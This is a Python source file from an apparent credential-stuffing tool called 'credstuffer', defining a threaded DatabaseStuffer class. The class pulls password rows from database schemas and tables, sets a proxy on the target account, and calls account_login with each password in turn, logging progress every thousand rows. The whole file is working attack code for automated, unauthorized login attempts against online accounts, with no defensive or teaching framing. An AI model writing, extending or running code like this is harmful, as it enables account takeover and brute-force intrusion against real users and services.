import logging
import threading

from credstuffer.dbhandler import DBHandler
from credstuffer.stuffer import Stuffer


class DatabaseStuffer(Stuffer, threading.Thread):
    """ class DatabaseStuffer to execute the stuffing algorithm with data from database

    USAGE:
            databasestuffer = DatabaseStuffer(account=account, schemas='a', tables='abcdefghijklmnopqrstuvwxyz',
                                              **dbparams)
            databasestuffer.start()
    """
    def __init__(self, account, schemas='abcdefghijklmnopqrstuvwxyz', tables='abcdefghijklmnopqrstuvwxyz', **dbparams):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class DatabaseStuffer')

        # init base classes
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)

        # create database handler
        self.dbparams = dbparams
        self.dbhandler = DBHandler(**self.dbparams)
        # prepare schemas and tables
        self.schema_list = list(schemas)
        self.table_list = list(tables)

    def run(self) -> None:
        """ executes the run thread for account logins """

        # set proxy to account
        self.set_account_proxy()

        # iterate over schemas
        for schema_char in self.schema_list:
            # iterate over tables
            for table_char in self.table_list:
                if schema_char == 'symbols':
                    passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=schema_char)
                    self.logger.info("Fetched {} rows from {}.{}".format(len(passwords_data), schema_char, schema_char))
                else:
                    passwords_data = self.dbhandler.fetch_data(schema=schema_char, table=table_char)
                    self.logger.info("Fetched {} rows from {}.{}".format(len(passwords_data), schema_char, table_char))
                for row, entry in enumerate(passwords_data):
                    if entry[0]:
                        password = entry[0]
                        # execute login
                        self.account_login(password=password)
                        if (row % 1000) == 0:
                            self.logger.info("Database row {} with password {}".format(row, password))





